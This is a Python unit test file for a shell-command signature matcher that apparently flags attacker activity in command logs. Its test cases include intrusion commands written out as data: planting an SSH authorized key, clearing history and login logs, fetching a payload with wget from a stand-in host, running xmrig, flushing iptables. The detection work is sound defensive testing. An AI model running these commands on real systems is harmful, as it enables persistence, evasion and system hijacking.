from pathlib import Path
import unittest

from match_signatures import load_rules, match

ROOT = Path(__file__).resolve().parents[1]


class B01B11Tests(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        cls.rules = load_rules(ROOT / 'signatures/rules.yaml')

    def check_cases(self, rule, cases, expected):
        for command in cases:
            with self.subTest(rule=rule, command=command):
                hits = match(self.rules, [('2026-11-07T00:00:00Z', command)])
                self.assertEqual(rule in hits, expected)

    def test_b01_positive(self):
        self.check_cases('B01', [
            'cat /etc/os-release', 'cat /proc/version',
            '/bin/cat -- /etc/os-release', 'busybox cat /proc/version',
            'LC_ALL=C cat -n "/etc/os-release"',
            "cat '/proc/version' /etc/os-release", 'true; cat /proc/version',
            'cat /proc/self/exe', 'uname -a', 'cat /proc/cpuinfo',
        ], True)

    def test_b01_negative(self):
        self.check_cases('B01', [
            'echo "cat /etc/os-release"', "printf '%s' 'cat /proc/version'",
            '# cat /proc/version', 'cat --help /proc/version',
            'cat --version /etc/os-release',
            'cat /proc/version --help', 'cat /etc/os-release --version', 'cat --unknown /proc/version',
            'cat /proc/version.bak', 'cat /etc/os-release-old',
            'cat /tmp/etc/os-release', 'cat $FILE', 'cat /etc/passwd',
            'ls /etc/os-release', 'mycat /proc/version',
            'cat /tmp/file > /proc/version', 'sh -c "cat /proc/version"',
            "echo 'unterminated; cat /proc/version",
        ], False)

    def test_b11_positive(self):
        self.check_cases('B11', [
            'chmod u+x /tmp/a.sh', 'chmod +x /tmp/a.sh',
            'chmod ug+x p', 'chmod a+rx p', 'chmod o+x p',
            'chmod 755 p', 'chmod 700 p', 'chmod 0711 p',
            'chmod 001 p', 'chmod 4755 p', 'chmod 777 p',
            '/bin/chmod u+x "my file"', 'busybox chmod u+x p',
            'LC_ALL=C chmod -R -- u+x p', 'true && chmod u+x p',
        ], True)

    def test_b11_negative(self):
        self.check_cases('B11', [
            'chmod 644 p', 'chmod 600 p', 'chmod 000 p', 'chmod 0666 p',
            'chmod u-x p', 'chmod u+r p', 'chmod a+X p', 'chmod u=x p',
            'chmod u+x', 'chmod 755', 'chmod +xfoo p', 'chmod 7555x p',
            'chmod 77777 p', 'chmod 888 p', 'chmod --help u+x p',
            'chmod --version 755 p', 'chmod --reference=other p',
            'echo "chmod +x p"', "printf '%s' 'chmod 755 p'",
            '# chmod u+x p', 'mychmod 755 p', 'chmod u+x $FILE',
            'chmod u+x *.sh', 'chmod u+x --help',
            'chmod u+x,g-x p', 'sh -c "chmod u+x p"',
        ], False)

    def test_row_counts_and_first_timestamp(self):
        rows = [('2026-11-07T00:00:00Z',
                 'cat /etc/os-release; cat /proc/version; chmod u+x p; chmod 755 p'),
                ('2026-11-07T00:00:01Z', 'cat /proc/version; chmod +x p')]
        hits = match(self.rules, rows)
        for rule in ('B01', 'B11'):
            self.assertEqual(hits[rule], (rows[0][0], 2))

    def test_b02_not_expanded(self):
        self.check_cases('B02', ['cat /etc/passwd'], False)
        self.check_cases('B02', ['whoami', 'id'], True)

    def test_b01_to_b17_representatives(self):
        cases = [
            'uname -a', 'whoami', 'passwd root',
            'echo key >> .ssh/authorized_keys', 'crontab /tmp/jobs',
            'unset HISTFILE', 'rm /var/log/wtmp',
            'wget http://example.invalid/p', 'base64 --decode payload.txt',
            'bash /tmp/a.sh', 'chmod u+x /tmp/a.sh', 'kill -9 1234',
            'xmrig', r'printf "\\x7f\\x45\\x4c\\x46" > p',
            'iptables -F', 'echo probe > /tmp/p; cat /tmp/p; rm /tmp/p',
            'command -v wget',
        ]
        for i, command in enumerate(cases, 1):
            self.check_cases(f'B{i:02d}', [command], True)


if __name__ == '__main__':
    unittest.main()
